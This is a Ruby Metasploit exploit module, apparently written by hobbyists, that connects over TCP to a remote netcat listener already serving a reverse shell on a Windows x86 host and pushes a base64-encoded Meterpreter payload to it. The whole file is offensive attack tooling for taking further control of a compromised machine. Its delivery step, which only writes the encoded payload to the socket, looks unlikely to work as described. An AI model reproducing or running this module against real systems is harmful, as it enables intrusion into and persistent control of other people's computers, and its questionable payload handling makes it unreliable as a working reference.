##
#This is a Metasploit module definition which will connect to a remote netcat listener and push a meterpreter payload to it.
# Metasploit Module

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Netcat Reverse Shell and Meterpreter Payload Handler',
      'Description'    => %q{
        This module will connect to a remote netcat listener that provides a reverse shell and push a meterpreter payload to it.
      },
      'Author'         => 'ida-bro & davinci',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://www.example.com' ],
        ],
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'    => 4096,
          'BadChars' => "\x00\x0a\x0d",
          'DisableNops' => true
        },
      'Targets'        =>
        [
          [ 'Windows', { 'Arch' => ARCH_X86 } ]
        ],
      'DefaultTarget' => 0
    ))

    register_options(
      [
        Opt::RPORT(4444)
      ])
  end

  def exploit
    connect

    # Push the meterpreter payload
    sock.put([payload.encoded].pack('m'))

    # Close the connection
    disconnect
  end
end
